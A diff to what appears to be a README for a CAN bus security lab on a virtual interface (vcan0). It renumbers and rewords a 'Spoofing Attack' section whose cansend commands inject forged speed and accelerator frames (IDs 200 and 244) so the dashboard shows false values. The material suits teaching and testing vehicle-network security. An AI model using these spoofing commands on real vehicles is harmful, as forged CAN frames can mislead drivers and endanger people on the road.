@@ -75,9 +75,9 @@ turn candumpFile.log into test_value.csv file
 # Spoofing Attack
 ```bash
 xxxx can be any number you like from 0~F to represent the speed.
-1 ./cansend vcan0 200#000000xxxx //if 000000xxxx is a speed more than 10, the dashboard won't change because the speed difference between dashboard and accelerator is too big.
-2 ./cansend vcan0 244#000000xxxx //change the accelerator speed.
-3 ./cansend vcan0 200#000000xxxx //dashboard should change if the number you enter isn't too much bigger or smaller than the number you enter at step 2.
+./cansend vcan0 200#000000xxxx //if 000000xxxx is a speed more than 10, the dashboard won't change because the speed difference between dashboard and accelerator is too big.
+./cansend vcan0 244#000000xxxx //change the accelerator speed.
+./cansend vcan0 200#000000xxxx //dashboard should change if the number you enter isn't too much bigger or smaller than the number you enter when ID is 244.
 ```
 ## PC
 **1.download test_value.csv**
